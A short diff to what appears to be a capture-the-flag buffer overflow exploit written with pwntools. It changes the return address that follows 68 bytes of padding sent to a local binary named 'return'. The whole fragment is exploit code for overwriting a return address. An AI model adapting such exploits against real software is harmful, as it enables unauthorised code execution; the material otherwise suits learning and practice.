@@ -2,7 +2,7 @@ from pwn import *
 
 r = process("./return")
 offset = 68
-target = p32(0x08048646)
+target = p32(0x08048616)
 payload = ""
 payload += "A"*offset
 payload += target
